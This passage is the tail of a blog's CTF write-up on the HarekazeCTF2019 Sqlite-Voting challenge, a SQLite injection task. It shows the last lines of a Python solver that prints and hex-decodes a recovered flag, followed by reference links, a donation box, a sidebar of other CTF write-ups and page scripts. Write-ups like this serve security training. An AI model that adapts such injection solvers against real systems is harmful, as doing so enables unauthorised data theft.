data-num="43"></td><td><pre>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] flag (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>  i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] flag:'</span><span class="token punctuation">,</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411082031979.png" alt="image-20241108203100687" /></p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk3Mjc5MjI=">https://blog.csdn.net/qq_46263951/article/details/119727922</span></p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMjI2NDc3OS5odG1s">https://www.cnblogs.com/20175211lyz/p/12264779.html</span></p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+          <a href="/tags/%E5%AF%B9sqlite%E7%9A%84sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="ic i-tag"></i> 对sqlite的sql注入</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-11-08 20:31:11" itemprop="dateModified" datetime="2024-11-08T20:31:11+08:00">2024-11-08</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" title="[HarekazeCTF2019]Sqlite-Voting">http://odiws.github.io/2024/11/08/HarekazeCTF2019-Sqlite-Voting/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?157575" title="[蓝帽杯_2021]One_Pointer_PHP">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[蓝帽杯_2021]One_Pointer_PHP</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/11/08/JMCTF2021-UploadHub/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?855410" title="[JMCTF2021]UploadHub">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[JMCTF2021]UploadHub</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#harekazectf2019sqlite-voting"><span class="toc-number">1.</span> <span class="toc-text"> [HarekazeCTF2019]Sqlite-Voting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite"><span class="toc-number">1.1.</span> <span class="toc-text"> sqlite：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlite%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> sqlite 常规注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text"> 题解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%88%E7%88%86%E5%87%BAflag%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 先爆出 flag 的长度：</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li><a href="/2024/06/06/%5BNCTF2019%5DSQLi/" rel="bookmark" title="'[NCTF2019]SQLi'">'[NCTF2019]SQLi'</a></li><li><a href="/2024/06/07/%5BNPUCTF2020%5Dezinclude/" rel="bookmark" title="'[NPUCTF2020]ezinclude'">'[NPUCTF2020]ezinclude'</a></li><li><a href="/2024/06/11/2019-EasyWeb/" rel="bookmark" title="[SUCTF 2019]EasyWeb">[SUCTF 2019]EasyWeb</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/26/1/" rel="bookmark" title="easybypass">easybypass</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li><li><a href="/2024/07/28/2019-SVGMagic/" rel="bookmark" title="[BSidesCF2019]SVGMagic">[BSidesCF2019]SVGMagic</a></li><li><a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="bookmark" title="[羊城杯2020]easyphp">[羊城杯2020]easyphp</a></li><li><a href="/2024/08/15/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="[安洵杯2019]不是文件上传">[安洵杯2019]不是文件上传</a></li><li><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" rel="bookmark" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></li><li><a href="/2024/10/17/RCTF2019-Nextphp/" rel="bookmark" title="[RCTF2019]Nextphp">[RCTF2019]Nextphp</a></li><li><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" rel="bookmark" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></li><li><a href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/" rel="bookmark" title="[羊城杯2020]EasySer">[羊城杯2020]EasySer</a></li><li><a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" rel="bookmark" title="[NewStarCTF2023公开赛道]include0。0">[NewStarCTF2023公开赛道]include0。0</a></li><li><a href="/2024/11/03/CISCN2021Quals-upload/" rel="bookmark" title="[CISCN2021Quals]upload">[CISCN2021Quals]upload</a></li><li><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" rel="bookmark" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></li><li><a href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/" rel="bookmark" title="[极客大挑战2020]Roamphp2-Myblog">[极客大挑战2020]Roamphp2-Myblog</a></li><li><a href="/2024/11/05/HXBCT-2021-easywill/" rel="bookmark" title="[HXBCT_2021]easywill">[HXBCT_2021]easywill</a></li><li><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" rel="bookmark" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></li><li><a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" rel="bookmark" title="[WMCTF2020]Web-Check-in-2.0">[WMCTF2020]Web-Check-in-2.0</a></li><li><a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" rel="bookmark" title="[蓝帽杯_2021]One_Pointer_PHP">[蓝帽杯_2021]One_Pointer_PHP</a></li><li class="active"><a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" rel="bookmark" title="[HarekazeCTF2019]Sqlite-Voting">[HarekazeCTF2019]Sqlite-Voting</a></li><li><a href="/2024/11/08/JMCTF2021-UploadHub/" rel="bookmark" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></li><li><a href="/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]ez_sql">[NewStarCTF-2023-公开赛道]ez_sql</a></li><li><a href="/2024/11/14/NPUCTF2020-webdog/" rel="bookmark" title="NPUCTF2020webdog">NPUCTF2020webdog</a></li><li><a href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/" rel="bookmark" title="[网鼎杯2020半决赛]faka">[网鼎杯2020半决赛]faka</a></li><li><a href="/2024/11/17/HCTF2018-Hideandseek/" rel="bookmark" title="HCTF2018Hideandseek">HCTF2018Hideandseek</a></li><li><a href="/2024/11/18/FBCTF2019-Products-Manager/" rel="bookmark" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></li><li><a href="/2024/11/18/BSidesCF-2019-Mixer/" rel="bookmark" title="[BSidesCF-2019]Mixer">[BSidesCF-2019]Mixer</a></li><li><a href="/2024/11/19/BSidesCF-2020-Cards/" rel="bookmark" title="[BSidesCF-2020]Cards">[BSidesCF-2020]Cards</a></li><li><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" rel="bookmark" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></li><li><a href="/2024/11/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-BabyJS/" rel="bookmark" title="[网鼎杯-2020-半决赛]BabyJS">[网鼎杯-2020-半决赛]BabyJS</a></li><li><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" rel="bookmark" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></li><li><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" rel="bookmark" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></li><li><a href="/2024/12/01/LineCTF2022-BB/" rel="bookmark" title="[LineCTF2022]BB">[LineCTF2022]BB</a></li><li><a href="/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/" rel="bookmark" title="[NewStarCT_2023_公开赛道]Upload_again!">[NewStarCT_2023_公开赛道]Upload_again!</a></li><li><a href="/2024/12/04/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/" rel="bookmark" title="刷新过的图片">刷新过的图片</a></li><li><a href="/2024/12/04/MRCTF2020-Ezpop-Revenge/" rel="bookmark" title="[MRCTF2020]Ezpop_Revenge">[MRCTF2020]Ezpop_Revenge</a></li><li><a href="/2024/12/10/b01lers2020-Spac-Noodles/" rel="bookmark" title="[b01lers2020]Spac_Noodles">[b01lers2020]Spac_Noodles</a></li><li><a href="/2024/12/10/De1CTF-2019-Giftbox/" rel="bookmark" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></li><li><a href="/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/" rel="bookmark" title="[NewStarCTF2023公开赛道]EasyLogin">[NewStarCTF2023公开赛道]EasyLogin</a></li><li><a href="/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/" rel="bookmark" title="NewStarCTF2023新生赛_BabySSTI_Three">NewStarCTF2023新生赛_BabySSTI_Three</a></li><li><a href="/2025/02/09/%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne/" rel="bookmark" title="公开赛赛道]UnserializeOne">公开赛赛道]UnserializeOne</a></li><li><a href="/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/" rel="bookmark" title="[NewStarCTF公开赛赛道]BabySSTI_Two">[NewStarCTF公开赛赛道]BabySSTI_Two</a></li><li><a href="/2025/02/09/BSidesCF2019-Sequel/" rel="bookmark" title="[BSidesCF2019]Sequel">[BSidesCF2019]Sequel</a></li><li><a href="/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/" rel="bookmark" title="NewStarCTF_2023_公开赛道Include">NewStarCTF_2023_公开赛道Include</a></li><li><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" rel="bookmark" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></li><li><a href="/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/" rel="bookmark" title="[Dest0g3_520迎新赛]SimpleRCE">[Dest0g3_520迎新赛]SimpleRCE</a></li><li><a href="/2025/02/24/SWPUCTF-2016-Web7/" rel="bookmark" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></li><li><a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="bookmark" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></li><li><a href="/2025/03/02/PyCalX-1/" rel="bookmark" title="PyCalX_1">PyCalX_1</a></li><li><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" rel="bookmark" title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></li><li><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" rel="bookmark" title="谁赢了比赛？">谁赢了比赛？</a></li><li><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" rel="bookmark" title="梅花香自苦寒来">梅花香自苦寒来</a></li><li><a href="/2025/03/13/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-outguess/" rel="bookmark" title="[ACTF新生赛2020]outguess">[ACTF新生赛2020]outguess</a></li><li><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></li><li><a href="/2025/03/18/JMCTF-2021-GoOSS/" rel="bookmark" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">97</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">11</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">87</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/11/08/JMCTF2021-UploadHub/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/" title="java-sec-code复现">java-sec-code复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">SHctf-2024部分复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/05/HXBCT-2021-easywill/" title="[HXBCT_2021]easywill">[HXBCT_2021]easywill</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/17/springweb/" title="springweb">springweb</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/misc/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/10/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/" title="[BJDCTF2020]一叶障目">[BJDCTF2020]一叶障目</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2024/11/04/%E6%96%87%E4%BB%B6%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86/" title="文件里的秘密">文件里的秘密</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/07/11/YLctf2024/" title="Untitled">Untitled</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/" title="vnctf复现">vnctf复现</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/11/08/HarekazeCTF2019-Sqlite-Voting/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
